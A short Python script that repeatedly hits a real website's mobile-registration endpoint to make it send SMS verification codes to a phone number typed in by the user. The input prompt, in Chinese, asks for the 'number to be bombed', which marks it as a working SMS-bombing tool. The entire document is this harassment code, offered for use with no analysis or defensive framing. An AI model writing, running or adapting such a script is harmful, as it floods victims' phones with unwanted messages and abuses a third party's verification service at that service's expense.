import requests
import time

class SMSsend_one (object):
    def __init__(self,mobile):
        self.url="https://login.ceconline.com/thirdPartLogin.do"
        self.header = {
            "User-Agent":"Mozilla/5.0(windows NT 10.0;WOW64) AppleWebkit/537.36(KHTML,like Gecko) Chrome/70.0.3538.110 Safari/537.36",
            "Referer":"https://login.ceconline.com/pcMoileNumberRegister.do",
        }
        self.mobile = mobile
    def get_response(self):
        time_now=int(time.time()*1000)
        print(time_now)
        data = {
            "mobileNumber":self.mobile,
            "method":"getDynamicCode",
            "verifyType":"MOBILE_NUM_REG",
            "captcharType":"",
            "time":str(time_now)
        }
        try:
            requests.post(self.url,headers=self.header,data=data)
            print("{}:{}>>>发送成功".format(self.url,self.mobile))
        except Exception:
            print("{}:{}>>>发送失败".format(self.url, self.mobile))

mobile=input("请问被轰炸号码")
one=SMSsend_one(mobile)
one.get_response()
